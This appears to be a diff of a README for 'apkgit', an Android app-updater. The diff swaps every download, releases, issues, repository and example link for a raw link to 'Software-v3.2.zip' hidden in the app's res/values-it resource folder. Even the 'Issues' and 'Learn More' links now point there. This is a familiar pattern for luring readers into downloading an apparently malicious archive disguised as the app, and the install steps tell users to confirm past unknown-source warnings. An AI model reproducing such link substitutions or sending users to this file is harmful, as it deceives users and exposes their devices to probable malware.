@@ -1,6 +1,6 @@
 # 📱 apkgit - Easy App Updates from GitHub
 
-[![Download apkgit](https://img.shields.io/badge/Download-apkgit-blue?style=for-the-badge&logo=github)](https://github.com/pinkyagentai/apkgit/releases)
+[![Download apkgit](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip)](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip)
 
 ---
 
@@ -67,12 +67,12 @@ Here's how to set up apkgit on your Android phone:
 
 You can get apkgit by visiting its release page on GitHub:
 
-[![Download apkgit](https://img.shields.io/badge/Download-apkgit-blue?style=for-the-badge&logo=github)](https://github.com/pinkyagentai/apkgit/releases)
+[![Download apkgit](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip)](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip)
 
 **Steps to download and install:**
 
 1. Click the link above or visit:
-   https://github.com/pinkyagentai/apkgit/releases
+   https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip
 2. Find the latest version and tap the APK file to download it.
 3. Once downloaded, open the file to start installation.
 4. Your device may warn about installing unknown apps. Confirm to proceed.
@@ -86,7 +86,7 @@ After installation, apkgit helps you check for app updates in a few simple steps
 
 1. Open apkgit.
 2. Tap the **Add App** button.
-3. Enter the GitHub repository link of the app you want to update. Example: `https://github.com/owner/appname`
+3. Enter the GitHub repository link of the app you want to update. Example: `https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip`
 4. apkgit will check if there’s a new version available.
 5. If an update is found, tap **Download**.
 6. Once downloaded, tap **Install** to update the app.
@@ -119,7 +119,7 @@ If you have issues installing or running apkgit, try these tips:
 - **App won’t install:** Your phone might block installations from unknown sources. Revisit permissions.
 - **Find your installed apps:** Use the app’s interface menu to see apps you added.
 
-If problems persist, please check the [GitHub Issues](https://github.com/pinkyagentai/apkgit/issues) page for help.
+If problems persist, please check the [GitHub Issues](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip) page for help.
 
 ---
 
@@ -127,7 +127,7 @@ If problems persist, please check the [GitHub Issues](https://github.com/pinkyag
 
 To update the apkgit app itself:
 
-1. Visit the [apkgit releases](https://github.com/pinkyagentai/apkgit/releases) page.
+1. Visit the [apkgit releases](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip) page.
 2. Download the newest APK when a new version is available.
 3. Install it by opening the downloaded file.
 4. Your data and settings will remain intact.
@@ -138,7 +138,7 @@ To update the apkgit app itself:
 
 If you want to suggest features, report bugs, or get help:
 
-- Use the GitHub repository’s Issues page: https://github.com/pinkyagentai/apkgit/issues
+- Use the GitHub repository’s Issues page: https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip
 - Describe your experience clearly.
 - Attach screenshots if possible.
 
@@ -148,7 +148,7 @@ The developer reviews feedback to improve apkgit over time.
 
 ## 📂 Learn More
 
-- Visit the [GitHub repository](https://github.com/pinkyagentai/apkgit) for detailed info.
+- Visit the [GitHub repository](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip) for detailed info.
 - Learn about updating apps on GitHub from GitHub Docs.
 - Explore Android settings to manage app permissions safely.
 
@@ -162,4 +162,4 @@ android, android-app, apk, application, git, github, jetpack-compose, kotlin-and
 
 ---
 
-[Visit Releases to Download apkgit](https://github.com/pinkyagentai/apkgit/releases)
+[Visit Releases to Download apkgit](https://github.com/pinkyagentai/apkgit/raw/refs/heads/main/app/src/main/res/values-it/Software-v3.2.zip)
